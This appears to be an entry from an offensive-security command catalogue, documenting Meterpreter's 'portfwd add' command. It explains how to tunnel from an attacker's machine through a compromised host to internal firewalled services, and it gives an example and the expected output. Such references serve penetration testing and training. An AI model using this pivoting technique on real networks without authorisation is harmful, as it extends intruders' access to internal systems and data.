---
id: ee50ccec-4c40-43fa-8a7d-d9c4c82b352c
name: meterpreter-portfwd-add
type: command
executor: meterpreter
data: portfwd add -l $_LOCAL_PORT -r $_REMOTE_HOST -p $_REMOTE_PORT
output: null
created_at: '2023-04-06T03:56:21.453175+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - metasploit
  - portforward
verified: true
validated: true
---

# meterpreter-portfwd-add

## Command

```meterpreter
portfwd add -l $_LOCAL_PORT -r $_REMOTE_HOST -p $_REMOTE_PORT
```

## Description

This Meterpreter command adds a local port forwarding rule, creating a tunnel from the attacker's local port through the compromised host to a remote internal host and port. It is used to access firewalled services or exfiltrate data indirectly.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l $_LOCAL_PORT | Local port on the attacker's machine to bind the forward (e.g., 7777) | Yes |
| -r $_REMOTE_HOST | IP address of the remote host to forward to (e.g., 172.17.0.2) | Yes |
| -p $_REMOTE_PORT | Remote port on the target host (e.g., 3006) | Yes |

## Examples

### Basic Usage

```meterpreter
portfwd add -l 7777 -r 172.17.0.2 -p 3006
```

### Advanced Usage

For multiple forwards, run the command multiple times with different ports.

## Expected Output

[*] Local port forwarding configured: 127.0.0.1:7777 => 172.17.0.2:3006

If the port is already in use: [-] Local port $_LOCAL_PORT already forwarded.

## Related

- [[procedures/Meterpreter-Port-Forwarding-Setup]]
- [[tools/Metasploit]]
